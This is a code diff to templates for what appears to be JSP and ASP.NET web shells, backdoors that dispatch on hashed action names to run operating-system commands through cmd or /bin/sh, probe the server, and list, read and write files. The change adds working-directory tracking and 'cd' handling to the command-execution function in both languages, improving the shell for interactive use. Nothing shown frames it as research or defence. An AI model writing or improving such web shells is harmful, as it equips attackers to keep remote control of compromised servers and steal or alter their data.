@@ -69,10 +69,19 @@ static String DSW_env() {{
         return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(System.getProperty("os.name", "") + " " + System.getProperty("os.version", "") + " " + System.getProperty("os.arch", "")) + "\\",\\"web_server\\":\\"JSP\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(cwd) + "\\",\\"separator\\":\\"\\\\\\"}}}}";
     }} catch (Exception e) {{ return "{{\\"ok\\":false,\\"error\\":\\"env failed\\"}}"; }}
 }}
-static String DSW_exec(String c) {{
+static String DSW_exec(String c, String w) {{
     try {{
+        if (c.matches("^\\s*cd\\s+\\S+.*")) {{
+            String target = c.replaceFirst("^\\s*cd\\s+", "").trim();
+            String nw = new File(target).isAbsolute() ? new File(target).getAbsolutePath()
+                    : new File(w != null && !w.isEmpty() ? w : ".", target).getAbsolutePath();
+            return "{{\"ok\":true,\"data\":{{\"stdout\":\"\",\"cwd\":\"" + DSW_esc(nw) + "\"}}}}";
+        }}
         String os = System.getProperty("os.name", "").toLowerCase();
-        Process p = os.contains("win") ? new ProcessBuilder("cmd", "/c", c).redirectErrorStream(true).start() : new ProcessBuilder("/bin/sh", "-c", c).redirectErrorStream(true).start();
+        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd", "/c", c) : new ProcessBuilder("/bin/sh", "-c", c);
+        pb.redirectErrorStream(true);
+        if (w != null && !w.isEmpty()) {{ File d = new File(w); if (d.isDirectory()) pb.directory(d); }}
+        Process p = pb.start();
         java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
         InputStream is = p.getInputStream();
         byte[] buf = new byte[8192];
@@ -146,7 +155,7 @@ String action = DSW_val(req, "a");
 long h = Long.parseLong(DSW_md5(action).substring(0, 8), 16);
 String out = "{{\\"ok\\":false,\\"error\\":\\"unsupported\\"}}";
 if (h == {h_probe}) out = DSW_env();
-else if (h == {h_exec}) out = DSW_exec(DSW_val(req, "c"));
+else if (h == {h_exec}) out = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
 else if (h == {h_list}) out = DSW_list(DSW_val(req, "p"));
 else if (h == {h_read}) out = DSW_read(DSW_val(req, "p"));
 else if (h == {h_write}) out = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"));
@@ -240,11 +249,17 @@ static string DSW_env() {{
     try {{ return "{{\\"ok\\":true,\\"data\\":{{\\"server\\":\\"" + DSW_esc(Environment.OSVersion.VersionString) + "\\",\\"web_server\\":\\"ASP.NET\\",\\"php_version\\":\\"\\",\\"current_dir\\":\\"" + DSW_esc(Directory.GetCurrentDirectory()) + "\\",\\"separator\\":\\"\\\\\\"}}}}"; }}
     catch (Exception) {{ return "{{\\"ok\\":false,\\"error\\":\\"env failed\\"}}"; }}
 }}
-static string DSW_exec(string c) {{
+static string DSW_exec(string c, string w) {{
     try {{
+        if (System.Text.RegularExpressions.Regex.IsMatch(c, "^\\s*cd\\s+\\S+.*")) {{
+            string target = System.Text.RegularExpressions.Regex.Replace(c, "^\\s*cd\\s+", "").Trim();
+            string nw = Path.IsPathRooted(target) ? Path.GetFullPath(target) : Path.GetFullPath(Path.Combine(string.IsNullOrEmpty(w) ? "." : w, target));
+            return "{{\"ok\":true,\"data\":{{\"stdout\":\"\",\"cwd\":\"" + DSW_esc(nw) + "\"}}}}";
+        }}
         ProcessStartInfo psi = new ProcessStartInfo(Environment.OSVersion.Platform.ToString().StartsWith("Win") ? "cmd.exe" : "/bin/sh", Environment.OSVersion.Platform.ToString().StartsWith("Win") ? "/c " + c : "-c " + c);
         psi.RedirectStandardOutput = true;
         psi.UseShellExecute = false;
+        if (!string.IsNullOrEmpty(w) && Directory.Exists(w)) psi.WorkingDirectory = w;
         Process p = Process.Start(psi);
         string o = p.StandardOutput.ReadToEnd();
         p.WaitForExit();
@@ -300,7 +315,7 @@ string action = DSW_val(req, "a");
 long h = Convert.ToInt64(DSW_md5(action).Substring(0, 8), 16);
 string outv = "{{\\"ok\\":false,\\"error\\":\\"unsupported\\"}}";
 if (h == {h_probe}) outv = DSW_env();
-else if (h == {h_exec}) outv = DSW_exec(DSW_val(req, "c"));
+else if (h == {h_exec}) outv = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
 else if (h == {h_list}) outv = DSW_list(DSW_val(req, "p"));
 else if (h == {h_read}) outv = DSW_read(DSW_val(req, "p"));
 else if (h == {h_write}) outv = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"));
